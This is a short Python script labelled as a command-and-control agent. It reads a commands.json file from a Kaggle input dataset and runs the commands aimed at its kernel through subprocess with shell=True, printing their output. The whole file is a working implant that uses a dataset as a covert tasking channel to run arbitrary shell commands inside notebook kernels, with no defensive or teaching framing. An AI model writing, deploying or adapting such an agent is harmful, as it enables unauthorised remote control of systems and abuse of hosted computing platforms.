```python
# C2 Agent - Dataset-based (no internet)
import os, json, subprocess

KERNEL_ID = 'KERNEL_ID'
COMMANDS_DATASET = 'COMMANDS_DATASET'

print(f"[Agent] Kernel: {KERNEL_ID}")
print(f"[Agent] Dataset: {COMMANDS_DATASET}")

# Read commands from dataset
commands_file = "/kaggle/input/" + COMMANDS_DATASET.split("/")[-1] + "/commands.json"
if os.path.exists(commands_file):
    with open(commands_file) as f:
        data = json.load(f)
    
    for cmd in data.get("commands", []):
        if cmd.get("target") in ["all", KERNEL_ID] and not cmd.get("executed"):
            try:
                result = subprocess.check_output(cmd["command"], shell=True, stderr=subprocess.STDOUT, timeout=300).decode()
                print(f"[Result] {cmd['id']}: {result[:200]}")
            except Exception as e:
                print(f"[Error] {cmd['id']}: {e}")
else:
    print("[Agent] No commands file found")
```
